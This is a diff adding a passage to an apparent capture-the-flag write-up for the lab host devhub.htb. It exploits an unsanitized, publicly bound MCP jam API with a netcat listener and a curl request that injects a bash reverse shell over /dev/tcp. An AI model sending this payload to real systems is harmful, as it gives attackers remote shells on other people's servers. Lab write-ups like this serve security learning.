@@ -114,6 +114,22 @@ Port 6374 gives us this:
 We can find the version for MCP jam:
 <img width="1684" height="774" alt="image" src="https://github.com/user-attachments/assets/60bd28f3-3e4f-4b49-b9c4-14487797a476" />
 
+Now, if we google MCP version 1.4.2, we'll find the following CVE: https://github.com/advisories/GHSA-232v-j27c-5pp6. It's a very usefull RCE that can be triggered via a simple curl. It works because the mcp API is binded to 0.0.0.0, meaning that anyone can access the API. COupled with that, tthe requests that go there are not sanitized. First set up a nc listener:
+```bash
+nc -lnvp 4444
+```
+Then send this request to the website, be carefull to alter you info:
+```bash
+curl -s -i -X POST http://devhub.htb:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{"serverId":"rev","serverConfig":{"command":"bash","args":["-lc","bash -i >& /dev/tcp/<your_ip/4444 0>&1"],"env":{},"timeout":5000}}'          
+```
+Execute it and get shell:
+<img width="789" height="341" alt="image" src="https://github.com/user-attachments/assets/1e911613-e981-4c3f-8bc0-a6c70b08c28c" />
+
+Now, let's make some inspections, first the open ports:
+
+
+No
+
 
 
 
